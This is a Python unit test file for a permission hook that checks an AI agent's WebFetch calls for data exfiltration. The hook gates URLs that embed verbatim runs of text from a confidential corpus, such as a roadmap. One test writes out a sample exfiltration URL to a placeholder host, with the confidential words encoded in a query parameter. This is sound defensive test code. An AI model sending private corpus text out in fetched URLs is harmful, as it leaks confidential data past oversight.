"""A7 / Option-B: a send carrying a distinctive run of stored corpus text is
gated even on an UNTAINTED first move (no prior in-session corpus read). Word-
shingle overlap, so URL-encoding / underscores collapse to the same tokens.
Heuristic defense-in-depth folded into the taint-confirm ask."""
import copy
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "hooks"))
sys.path.insert(0, str(REPO_ROOT / "scripts"))

import gate  # noqa: E402


class CorpusEgress(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = Path(self.tmp.name)
        corpus = self.d / "corpus"; corpus.mkdir()
        (corpus / "roadmap.md").write_text(
            "The Atlas Router cache layer eviction threshold tuning guidance "
            "for the Q3 pricing and layoffs plan is strictly confidential.")
        self._orig = gate.LEDGER_DIR
        gate.LEDGER_DIR = self.d / "led"
        self.policy = copy.deepcopy(gate.load_policy())
        # point the fingerprint at the temp corpus (absolute -> repo_root ignored)
        self.policy["corpus_fingerprint"] = {
            "enabled": True, "corpus_dir": str(corpus), "shingle_k": 6, "min_shingles": 1}
        import taint
        taint._CORPUS_CACHE.clear()

    def tearDown(self):
        gate.LEDGER_DIR = self._orig
        self.tmp.cleanup()

    def _verdict(self, url):
        return gate.process(
            {"tool_name": "WebFetch", "tool_input": {"url": url}, "session_id": "fresh"},
            self.policy)["hookSpecificOutput"]["permissionDecision"]

    def test_corpus_run_in_url_is_gated_on_fresh_session(self):
        # a verbatim 6+ word corpus run, URL/underscore-encoded
        url = "https://x.example/?d=atlas_router_cache_layer_eviction_threshold_tuning_guidance"
        self.assertEqual(self._verdict(url), "ask")

    def test_benign_url_still_allowed(self):
        url = "https://x.example/?q=hello_world_ordinary_request_nothing_sensitive_here"
        self.assertEqual(self._verdict(url), "allow")

    def test_incidental_short_overlap_not_gated(self):
        # fewer than shingle_k matching words in a row -> no distinctive run
        url = "https://x.example/?q=atlas_router_status_check"
        self.assertEqual(self._verdict(url), "allow")

    def test_disabled_flag_reverts_to_allow(self):
        self.policy["corpus_fingerprint"]["enabled"] = False
        url = "https://x.example/?d=atlas_router_cache_layer_eviction_threshold_tuning_guidance"
        self.assertEqual(self._verdict(url), "allow")


if __name__ == "__main__":
    unittest.main()
